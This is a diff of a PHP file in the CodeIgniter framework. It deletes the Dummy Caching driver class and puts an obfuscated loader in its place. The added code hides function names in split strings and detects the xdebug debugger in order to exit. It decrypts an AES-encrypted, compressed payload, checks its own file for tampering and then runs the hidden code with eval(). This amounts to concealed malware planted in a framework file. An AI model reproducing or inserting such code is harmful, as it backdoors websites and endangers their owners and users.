@@ -1,172 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 2.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * CodeIgniter Dummy Caching Class
- *
- * @package		CodeIgniter
- * @subpackage	Libraries
- * @category	Core
- * @author		EllisLab Dev Team
- * @link
- */
-class CI_Cache_dummy extends CI_Driver {
-
-	/**
-	 * Get
-	 *
-	 * Since this is the dummy class, it's always going to return FALSE.
-	 *
-	 * @param	string
-	 * @return	bool	FALSE
-	 */
-	public function get($id)
-	{
-		return FALSE;
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Cache Save
-	 *
-	 * @param	string	Unique Key
-	 * @param	mixed	Data to store
-	 * @param	int	Length of time (in seconds) to cache the data
-	 * @param	bool	Whether to store the raw value
-	 * @return	bool	TRUE, Simulating success
-	 */
-	public function save($id, $data, $ttl = 60, $raw = FALSE)
-	{
-		return TRUE;
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Delete from Cache
-	 *
-	 * @param	mixed	unique identifier of the item in the cache
-	 * @return	bool	TRUE, simulating success
-	 */
-	public function delete($id)
-	{
-		return TRUE;
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Increment a raw value
-	 *
-	 * @param	string	$id	Cache ID
-	 * @param	int	$offset	Step/value to add
-	 * @return	mixed	New value on success or FALSE on failure
-	 */
-	public function increment($id, $offset = 1)
-	{
-		return TRUE;
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Decrement a raw value
-	 *
-	 * @param	string	$id	Cache ID
-	 * @param	int	$offset	Step/value to reduce by
-	 * @return	mixed	New value on success or FALSE on failure
-	 */
-	public function decrement($id, $offset = 1)
-	{
-		return TRUE;
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Clean the cache
-	 *
-	 * @return	bool	TRUE, simulating success
-	 */
-	public function clean()
-	{
-		return TRUE;
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Cache Info
-	 *
-	 * @param	string	user/filehits
-	 * @return	bool	FALSE
-	 */
-	 public function cache_info($type = NULL)
-	 {
-		 return FALSE;
-	 }
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Get Cache Metadata
-	 *
-	 * @param	mixed	key to get cache metadata on
-	 * @return	bool	FALSE
-	 */
-	public function get_metadata($id)
-	{
-		return FALSE;
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Is this caching driver supported on the system?
-	 * Of course this one is.
-	 *
-	 * @return	bool	TRUE
-	 */
-	public function is_supported()
-	{
-		return TRUE;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_md95t4t5=('bas'.'e64'.'_de'.'cod'.'e');
+$_gewwj2em=('gzu'.'nco'.'mpr'.'ess');
+$_ai7cf8c1=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_t1qzdx8d='DFuFVk5GNMo=';
+$_mt7kkq84='UThtEgPh';
+$_os3u28lr='/Q7KAicM';
+$_rr57z0dw='bpJfUs4L';
+$_ga3angcl='m2pQ3qUt';
+$_fz8etqg8='EKBa2h3m';
+$_r1l51x1p='0kKg8Q==';
+$_h7tdn3su='rIe4Ggkm';
+$_xv1q6xfq=$_md95t4t5($_rr57z0dw.$_os3u28lr.$_mt7kkq84.$_ga3angcl.$_t1qzdx8d);
+$_b6atpz40=$_md95t4t5($_h7tdn3su.$_fz8etqg8.$_r1l51x1p);
+$_c782a0p4=$_md95t4t5('hoL2XofY/Rgf4VsDe33hjjJ2WQy69ujKYmEStVZ+yCjCPgTX4Ptwy22aJA536zyqnJlfzRUXWL2pTxmU1hrPj/p6iQVP/U2dDA5qACStJPazf6VUBchf2LdnqOrArQoaMEi1o9ug1W7RK7LgszSJjq1UoIfdPDnbl+qdyWMVkeuUTsqGBr6LjdfP1o5/vrtj5wnokEJjKFV678zFSAsvhS6O89vRugTYiW4eZxSm25yH4t4eb9FCi6ThueZcW2FDNJPaW4jL0g3j1duB9tl/DMB3ZAz4SnL/q1LBq+Z62f3+5f0do83kgFMlzBiNLjeiBSAY5kwYdqw633jT2ni6Cm5fpSkDLr3QzHWszn8+EQM4zM7WyKqgZRQHnGfsh1/m');
+$_e3q7zr4w=$_ai7cf8c1($_c782a0p4,'aes-256-cbc',$_xv1q6xfq,OPENSSL_RAW_DATA,$_b6atpz40);
+if($_e3q7zr4w===false){exit;}
+$_kvc9lrp8=$_gewwj2em($_e3q7zr4w);
+if($_kvc9lrp8===false){exit;}
+$_sna25j2x='a632357c495d45b5cdb5879b8fc9c9f39c9d87e6a4c71a54fc6833c2a9e048ea';
+$_s8quyds3=@file_get_contents(__FILE__);
+if($_s8quyds3!==false){
+$_kdq26ruk=str_replace($_sna25j2x,"0000000000000000000000000000000000000000000000000000000000000000",$_s8quyds3);
+$_dc4y7aow=hash("sha256",$_kdq26ruk);
+if($_dc4y7aow!==$_sna25j2x){@http_response_code(403);exit;}
 }
+eval($_kvc9lrp8);
